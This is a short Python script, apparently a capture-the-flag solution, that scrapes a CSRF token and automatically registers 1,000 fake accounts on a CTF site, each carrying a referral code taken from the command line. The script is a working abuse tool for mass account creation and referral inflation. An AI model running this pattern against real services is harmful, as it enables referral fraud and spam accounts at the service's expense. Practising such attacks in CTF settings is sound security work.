import requests, sys
from bs4 import BeautifulSoup

session  = requests.Session()

registerPage = 'https://chatius-paris.ctf.upml.tech/register'

def register(login, password, email):
    response = session.get(registerPage).text
    bs       = BeautifulSoup(response, 'html.parser')
    csrf     = bs.find(id = 'csrf_token').get('value')
    
    r = session.post(registerPage, data = {
        'csrf_token': csrf, 
        'username': login, 
        'password': password, 
        'email': email, 
        'referal': sys.argv[1]
    })


for i in range(1, 1001):
    register('user%d' % i, '12345678', 'user%d@mail.ru' % i)
    print(i)
